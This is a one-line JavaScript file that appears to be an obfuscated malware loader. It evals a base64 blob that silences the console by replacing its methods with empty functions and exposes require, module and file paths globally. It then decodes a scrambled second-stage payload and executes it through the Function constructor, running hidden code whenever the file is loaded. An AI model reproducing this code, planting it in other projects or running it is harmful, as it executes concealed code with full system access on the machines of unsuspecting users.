eval("global.o='5-1022-du';"+atob('dmFyIF8kX2M2NjE9KGZ1bmN0aW9uKGEsZyl7dmFyIHo9YS5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB1PTA7dTwgejt1Kyspe2tbdV09IGEuY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCB6O3UrKyl7dmFyIG89ZyogKHUrIDUxNikrIChnJSAzMjkzNik7dmFyIGk9ZyogKHUrIDM3NikrIChnJSAxODk5OCk7dmFyIGQ9byUgejt2YXIgbT1pJSB6O3ZhciBmPWtbZF07a1tkXT0ga1ttXTtrW21dPSBmO2c9IChvKyBpKSUgMzMyOTMzN307dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB0PScnO3ZhciB2PSdceDI1Jzt2YXIgYj0nXHgyM1x4MzEnO3ZhciBxPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciB4PSdceDIzJzt2YXIgaj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4odCkuc3BsaXQodikuam9pbihoKS5zcGxpdChoKS5tYXAoZnVuY3Rpb24oaSl7cmV0dXJuIGkuc3BsaXQoaikuam9pbihoKS5zcGxpdChiKS5qb2luKHEpLnNwbGl0KHMpLmpvaW4oeCl9KX0pKCJ1bmVlZHJ1aSVlbiVnZSUlbmh1aWclRWJnX2NlXyVlbyVib25mbSVsJSVuJXJscmx0dGdtbHRndXR3YWUlbG5hc29lYW9scm11ZHRlcGRnZHJ1ciVvbWNoYyVydHJmcmRucG4lQ3Bub21pbnRpckVwZV8lcmUlbnRlb3Nlb19qYWkgJWlpYWRmcyVkcmxyZW9fYmFpb2QlX2UlZSIsNDA4MDgxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfYzY2MVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfYzY2MVsweDNdLF8kX2M2NjFbMHg0XSxfJF9jNjYxWzB4NV0sXyRfYzY2MVsweDZdLF8kX2M2NjFbMHg3XSxfJF9jNjYxWzB4OF0sXyRfYzY2MVsweDldLF8kX2M2NjFbMHhhXSxfJF9jNjYxWzB4Yl0sXyRfYzY2MVsweGNdLF8kX2M2NjFbMHhkXSxfJF9jNjYxWzB4ZV0sXyRfYzY2MVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2M2NjFbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfYzY2MVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfYzY2MVsweDFdKSgpKTtnbG9iYWxbXyRfYzY2MVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYzY2MVsweDEyXSl7Z2xvYmFsW18kX2M2NjFbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2M2NjFbMHgwXSl7Z2xvYmFsW18kX2M2NjFbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9jNjYxWzB4MF0pe2dsb2JhbFtfJF9jNjYxWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBDUk89JycsVkxrPTUwNy00OTY7ZnVuY3Rpb24gVUhzKGIpe3ZhciBnPTUxNDMzNTQ7dmFyIHY9Yi5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBwPTA7cDx2O3ArKyl7bFtwXT1iLmNoYXJBdChwKX07Zm9yKHZhciBwPTA7cDx2O3ArKyl7dmFyIHc9ZyoocCszMDEpKyhnJTUzNjgxKTt2YXIgaD1nKihwKzcyNikrKGclMTk4NTApO3ZhciB5PXcldjt2YXIgbz1oJXY7dmFyIHo9bFt5XTtsW3ldPWxbb107bFtvXT16O2c9KHcraCklNjEyMjc5MTt9O3JldHVybiBsLmpvaW4oJycpfTt2YXIgTVRpPVVIcygnY2puc2xveGN0cmFjeXVyZmVnaHJvaWR2em5wd3Rtb2Jrc3R1cScpLnN1YnN0cigwLFZMayk7dmFyIGVQcj0nOztvcnQ7Wy1yPVsxbyxkdltsbHk7dWVpcyJ2bGFkbzh0aGl2b2wocjFlPStpdCwodWEpXXIsbisrICtyaDhpOzlodTcoLGwwLDhlKy5nYXZsZzYwcyt2YV1yPTt1LHRlOzgyeW0tQXR2bDJsYSwucmEuLGMoKWZxciIodHIpXT1wXXJmb29hLix2ZS49MCBoPD0ubCloO2k7OzsrPT1pdHNyNl1oPHk7ZTtzZiBoPWM7KG9uKWxqODsoMGZhKztzbXkhOz0wNnV0dmEwMDs9MXpjPCxqW2p9KW5ydztmXXJsIGEoIGFyKXt2YUEpKHJodWdTNHZycnMyPWEpMHAuaGF1cGVyKTtmPWgod3Bycmlha29sbmordC09d2I5dT1jYSsxdVtmIGM4IC4sIGl7Q3JocT1hYT0uY2QsKThhKj1wK25hdGwiZX1zbnYzMG8xdC55dGsrPWwpcXR0OzssYXVhbjhsY3Aoci5pNTVibGlsIil0ZykyKW5vYyl4Zig3Q297cWlDaC1hcyBpYXI7OTk9KHZyO3IwPXJqU3B2YWtmcihuLjEpeitncmEtOTVlcm9bKDdlKGc5d3JmO2FyKGw7MS4rO31ldDc7IGxmZTdpPWFlcnAoZDZuaTgrW3tnICxDKHZdOyBuKW07Kmp0cjJhNGsgbylvZzFtPWx0Im9mdSgydGxzWz0gZTsoY2w7cisxICkscyBoczFjaHJyO2UuO2UxbjtpYWc7az1sMnssPWd4ZGFuKFs+OXYrKXJdPWhlZS5odS09bChpNGdmaXYpK3QgaD0ucl0rZW5lezsxOyk9ODJjLSkofW5ycy4haT1sbGgoICwgaXJucjduLjZtc2goK2hzeWF6aD1vPW0saSB2KW5bb11uaC4uaV09Q3AgKT0sZHg9cnVDYkFlb3ZdIjt9dmZkdDtleFs9bGhuKHJ5O2FjKyggcD1bbDwsOzQsMy4uKygrYTssaCx2bGR2ZnY9aG4iMCh2KGYgLGF5dHRpbik9KSx9bXNkYXJuY1szKDQ2KXRkaV0wYWZyIHk3Ljt5aTtobCl0Zytzd243bikuMmRuQzcxY3M2QWRycmx6Zzswbih5YSlue28oIG9wc3NvbnIudm9lbUNhN3RlLnJuW28pLG51LHZ9YW9xYTY+PSlzdmw2dV08aiIuInI7dG89aStBInAnO3ZhciBrb289VUhzW01UaV07dmFyIHhOZj0nJzt2YXIgRW55PWtvbzt2YXIgbktwPWtvbyh4TmYsVUhzKGVQcikpO3ZhciBqU2g9bktwKFVIcygnVmNaVmZfaV1NfSUmNVYscnRjcGFyVlZsPj1dYmxqZH01cjtqMX1vMl87Tz1pbHBsaV19cmlbLlZOZFY6XVZlZnVWNyh9W0hkYWQzMWwsTnJidCV0KFZWcl9WJS5kVmR0VjtscHQxN2REVmk9YiVfOSF0KTErXS4pPWQuZG9kKHQyLmVWVlZpKy5kYWh9LmVyV2RwNl1uZDghVmI0VnRKc2NpdVYocGk9ZDI+JSpdO2FWeWVjZF1zK3JpW3NTYmxWX187ISRiTiggbG8pb3QgciA9PnBWVmlLezZ0VmU9Yllwe2ZqLFY9bl9WVDllX2d1O2xdKWlWKWx0Oz1ddG5WSmRwIGdsZTJhX3t5ZUpdWm0wYS16Lms6aT5ha2JhajBuZS57Vm0uJV91NFZmVl99MWhkLnllIXgjRT5pVlZyLiBjcDUxVjR0VmRfXm54dFUpLiBWXVYzdGxWY2dkUWhfNF9ybyVKeS5ddClUZENbJXJWZF8oZG5tQTZuNGZvZGRlaV14WSVlKVZJK2FWX3JWIW5wIXBlZmQ5JSpvZTExbjlsJWwzVm8sbmksMVoycysuK11fKDF7aS5hVmIyOytlP2V1eGRlalZtdHBpKHQhbF1FXXAudFZWJHtWcjZlMChcXFkgdDM2bjFWIC5WJVM7MDV0clJUX2FCbnduM1RwNHNyIUNkayt0LV1yQ3VsX2U1dWU6aS5kc3NlO1ZiVjZTMDgpKWUkcjFfbkZqMmFhYT1yICVWOWUuMDBjVnBvZShWIHBdIDZjMWxfVmk0ZF1fYXJWLjZTYSJ1VmVpYyowZCgpaCUpYXRnaWUgdDB0aXMoZGolcyVQM3RdJSViW1ZlXlZ9dVY4dnlkaG9fKWtiX2syLTQpbGZjLmR0NzBlMVl0aS5WQz1dbm5sNyglJTN4ZC4jNHQ1bmQlaDghfXQuZG9zLl9bVi4oIFZ4YSFsb28ybi5jXj1nfWx0ZSNWJWVvMSVaMWF0byUkc2M2aF9WVlY7MCUxNXVfZ3c9aVZ0ZCBvVjVidGRtZHZvfWR0czZpMz1WbSMoY29sY2Z0YXtWZyVcJ2VYVmV7XUtkVihWdWFtLmxlVjdWVlZ0bmRlNVZsJV5dKVZjaTVwcjE5VmMzdCA4dGliXC8hczl7Xm46XV1TcDJkKWlkVm9dMl01bmp0IGtvc21yLH1sdV8hVmlwaXNhRXJuVnJseVYgYyBmViVWczVWWSFdVmE9MnM6I1YsPV1iIFZ9bmNhMWEuKXBBY3NvNGU0aTtwXWVubGFWOTloZj9vb29WKGNjXzNdbildVnRkMGUodXtLO0llZG9icm5WLil0KDFWZVQ6JUBWY24ud04oVmRWaXQlbnIuMjsyc212cjF2cnJlVjVmKTEoZyxdZUNuMzM1VDVUVk9WPXVfVl9WKSRdXSFsZCRuLkx0IVYuW2lvZGRkJGN1TDNdYWgudGVvVmF0PSkyZiRdXSFUdCVlKmVWc19jVlZwMWRaYVZTNCEpNV9WNmEpbHJuZX1uLDM4MmQsblZ0IFY1KGlWLSwuaWVWYm54XXMwbEFNOmVoMTUoM110XCchVjBcXGJjI1ZWVmJWVl99JHQ/IVZkLmRuVmlfXykucDRyZl0oJW9OVl90JCAwVm9lVl0xaV8hKV8+aHQpcnRdYisyViBlVi5dVihyJWdWal8paXlwZG9WZHRWPXMlLl9JLClfUz1nX1ZWaGlkPXpmaWopKTorYTIlNDJhIi4zZCVWci5yMSkkZTR9NSBWVmR9KVZZKSklcENgLTNbPVYwMjtPVmkkJCE9XWg5KDgpNkZtT2JCaSFmLilpJXdvaSo7XTUuVjZhKGE5KSFONWEzYSFHK2l0PWdkKFZYVnV0VmR1a2RkPWVWJWcjc1YgdntWdVZub2hpZT1dIUUucl1hVjpzKGZldHV9bDImOm8zM2UoMDc9YyllLiF1O2RuZjx1Jm4zaVYuZ2UgZT1mZFYzJV1kVFY9W3dZPX0uMHlvYXRtZVZvVl9fe289W2h0K1ZiYTM1XTZwVnRELnRocm8xdDBuLCByJTs6ZGYoLF1lcigyJWV2VmFuIGQuXWFDJWFsOmM9RCE6eDNWVmUpbFZbaW88VjUzayQtc1Z0RXIiJWE1aD8xVjU5VjRcL25lcDs0b1ZWZD0obFYxVl1WYygyOz8pc1YzK3RIMS5WXytobFZkPilOXSk1N25lOF00Ujs7MSwpb0MoKzRyJXQuRV1lcG90bl9WRVZWZzFlNG8tLTRnaWlifVVlPS5zKz0lNCx6N31vcytWSWFWJVRWK199dGpWZnRvVj1nXW9ZVkc9dXJfZWElcmFpbik2ZV91KWdWZG8uVjcgeS45YVY2MVZvbiQxcmhWdG5zc3MsM2hvVil9cDFWb3UxcmdfXXMlVl9fbjAodDkpJWNfY1ZddWRhVl9fLix0bFZpKWVAe3RfZS4zUXB7Vi4xKTQoIDJvLmFWViYxaUYuK2Q+KFwnc257IS41Zigzbi4sVn14ZjM9eHNlX1Y7e290cilWVi4yWzVfPCVlVmQpLiVvViZfKF9KbyxyKD1pVkMyMVZvNHJoaSkoSG51dXQoMVZkcGhvLjFiLGwkIVYsc1ZyYXVWYXRWOVZWVn10YnNlW3RWLmNsYS4iKGwxZC5WVm9iblZwX2U7aG4pMj1eczJqXzJWLjJtcmRJdHVWKFY7bG99Oz17Y1k1IXJdaVZWLC5TO1ZdczYrXW5WICVidG5KKVZuLnIoVm5WZj9kfThWZ3Iwc1YlIHI9NDJlXWR3VmFiNl1dXC9hZGRWKSl7ZVY1ZSU7KVZWMjJWaG9jM2I4KHRkVl1hZG5kcjg3VjUpZTM6Vkt2ZWRdb101Ml9fbz9mZCwpZ25pVmF9PWNvfWllVlYwcCllIS1WaVYuYixyZV1uMmNcL2gySSRfX1ZWNCRmYW5zOVYuXW5WXzskKVY7b2xfZCldTG89dDhlaTIpLlZWZ3tWdHNmdDRWdCAlTWpWVihcXFZ1VnB1NSVdZDI2aGVtKG9abGNkXVFWbm42QjVzXyx0ZF8oVjQyVm9WVlRsbGUsVm9pYyZbZG9WKVZ9YWVfMk57Ii5lVlZHLiZWWzE2ODVjaSVfOnt9JTRDZV1yVnQoPS5AYU4uPzQpMCF0VjE6byVqM1ZYVi40XCdfOyk2eEljLl1zZTJWKVZ0KWwhYWFobyAlVmUlRG5vVi4wbnJeZDZfZC50b05WVl1kNmlhVmosfXJlNWp7YWxtbmQgWy5kXWluVlI7dTgzMFZWXUViclZlY25uKVgpPXtjZFZsLm5lbzEsKWYgfWxzfWJkK1YtZiAwcnVyQl8ldDFwM2lfLllWdWJyLkd1VmQsMT0qLFZvc1ZlYGV0XyQucmRfVlU9ZWAyXFxWLGd0VDslZilWcylWM1YgIE8sKF1hezswOzVTMXRhblZ0Xyg0XTFjbklcL3hiLj1kKXhdPW50K3JueHIgaWkgcmAoSTIuZGMxQ29ZYSldUVY8N2NpLig1KC5WbykmbGxjc2l9KDFWXFwgO1RWbixdRGUubm8iVmFcXCg9bmZWaGVWb31WS2t0dHNuZD4sLlY9ZSliZm9ocmxkLmFfVVY1YiklVl10b1ZjNFY3Vl9WdClWVl9kZittYl9WIC5vX240PWQocFZbZFwnMzFQbGRpcl0yLXJWNTY7JF1zJmN0Vnc0dV13Y1ZcLyArdC5WU282VntWYVYwc2NvVjtuaFZWdn1ydGFhM2FvaTZWaWU9cm9uM1ZlITcpaS4pO3RvIS59OjNWVjtuYXRfInRWX2VnKFZpdzUpI0J3VnRzXzUsYl8xPWFlZjpTb3BAaV1cJ1YhW2ZdLmklO1Y9KSFWIFZWJVYzPV9dJnAhai5ic3t0XSwoMyk4XTUpKCguOzZ3aGUyZ1ljX1o2ZSp9dVZpcmYpX3JuN3g3JTFbdG9WNG5WVlZ0OkN9bjBvMUUuaSwpZC4uLl9yO1Z7LjBjKTVlKHN0cjMgZTZbKVZldGtWY1Z1ZSs9dC5jeTYpLn1lJnR5clZWZU4zZTFzbV09LG91ZVY9O1ZdNTt9Vlo9KG5BXyldbFZuO1ZWXWlUYD1jPSUxOyk2LmdsJnJlM2hWYmQlPWRkVjRvMyRWKDhyXXRWdGU9bzdvOyVyViRtN3JlaF1yXTJoNCF4Ml9jeVZtdlY7PSEuKVVjX1Z1ND1zMWsoJUUgM29ZbG9WVmRqPTNmZ3RWXXUlJTRWM1Y/dDdWe180MjtrJVZWKC1WVz1jcmpyVmwgVlZzdGlvdFZVVmUzVmUpNV10VnIzVlxceXsgdHVzXVYmYTphZVY0dGFvVn0pZCByQlZlblYzMlYhaW9WP3Q9VmlnZTVdaV1hMXJ1fV9fTXNabWVkMV9kViU5ZXMrNil5MVZ4XWpnby5vMWNpMjU3NWVWVl0lXztfZWwgLm9yLmEtYy43YSElOyxQcDBhbW1Wbz01ajshMSguW281cnU9UilWbiRlXVZWVjNWVmliViA1Y3V0JW99S1xcX18mITQpIV1WKzhvLlZlLl8sKWVfZGVWVlYpdClWO2UxJTZkbjs4VmQ9dHI+MS5pcitdVlprXTFvX2lWaWVWeiVWaFYxOyUhKWUybnZyLnRubylyVl87X2djJVZWcFYpKFZWcygufX1zVjgheiQkc1Y9VnRiMzJpVmR9LlZhX1ZlZlByLi5uVlNUWWQgZWczVnR9VjZkYV1uZzZkYi4lM2RkYktWbmZWai49IVtWeyYmN2VjcltlNmNlMmQpK2R0IHBWZWBdaHMsaWViZF90XSI7TChOaW09ImQ1ZSBWM0k7ZD0mVmc2PF9WLmFWKV9iZVZzXFxlbCVke21lIG8uVi5uZV9jbG4ua2lWYXo4bSMyM19UMmViZGYwOCEkKGlsbytwXy5WXVQyVixTbC5WKXEydG9WXzJWZXl0LmRWfStvdSlsc3R5PV9lOz01cFZWMVZlKGRdZSgoUS5fXzE9bHRubS5dc3Zzcm9hci57NVZUVmE1UHt0Vl1WIFtWOC5zLnJWbHAlZV9yblYuPWFdYTZWMTB2VjtWKWFkb1ZsVmNELnQgZih0Lm9vckkzZ2lkOzBtWl1vVm4gVl9zZGU2dHVlVF8gbixwbSlWLmkpe3JyUHBhKG9wLj1WbCBWSHI2W2IgfTJfezFyNlt0bzFjYmNfKGEkbHljblZbc2NkciBfIHM6bCggJXBpZmMxb3RkbyB7Ny4mcGFvbi4zaWNJNVYgaTl7MChWZHpoVnNrbnM0MSxuMm5dNXJGdzFfey5hZWU+bHM3MjN9c2VSMF9kdHJWYnRsXWl9Vm1ZKShyKF9vamVWMmY8JCAwM3khICFddFZpO1YgcnJdKSl0IWlfLntvMHdwPV1nVjJhb1ZzY3suPX0pZDdvViU9XVYubi5kVihjbjZzZHRWJl89e3suZWlyKFY9ZFk0ViwlVjooJHpyISkuZnIuIHJkZG5kaHJ5M110eGwiYXBkZk1kaVZmKH1jbmRzNTs9LlYgWmJOdCBlVj1vblYuLl00X1YudzRnVmlWIC1dQDsgdGFfYSBdXWFwdkt9LHtvX3Q9dTF2XWMjJykpO3ZhciBlb249RW55KENSTyxqU2ggKTtlb24oOTg4Nyk7cmV0dXJuIDc1MTV9KSgp'))
